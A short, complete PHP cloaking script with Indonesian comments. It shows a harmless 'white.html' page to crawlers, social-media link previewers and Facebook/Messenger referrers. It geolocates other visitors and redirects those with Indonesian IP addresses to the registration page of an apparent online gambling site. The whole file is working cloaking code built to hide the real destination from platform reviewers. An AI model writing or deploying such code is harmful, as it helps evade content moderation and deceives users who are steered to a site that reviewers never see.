<?php
$ip = $_SERVER['REMOTE_ADDR'];
$ua = strtolower($_SERVER['HTTP_USER_AGENT']);
$ref = isset($_SERVER['HTTP_REFERER']) ? strtolower($_SERVER['HTTP_REFERER']) : '';

// Daftar user-agent bot
$bots = ['facebook', 'meta', 'bot', 'crawler', 'whatsapp', 'telegram', 'pinterest', 'google', 'preview', 'linkedin'];

// Jika user-agent terdeteksi bot
foreach ($bots as $bot) {
  if (strpos($ua, $bot) !== false) {
    readfile("white.html"); exit;
  }
}

// Jika referer berasal dari Facebook atau Messenger preview
if (strpos($ref, 'facebook') !== false || strpos($ref, 'l.facebook.com') !== false || strpos($ref, 'm.me') !== false) {
  readfile("white.html"); exit;
}

// GEO IP check
$geo = @json_decode(file_get_contents("http://ip-api.com/json/$ip"));
$country = $geo->countryCode ?? null;

// Redirect jika IP Indonesia
if ($country === "ID") {
  header("Location: https://sonic188ez.com/register");
  exit;
}

// Selain IP Indonesia → white page
readfile("white.html"); exit;
?>
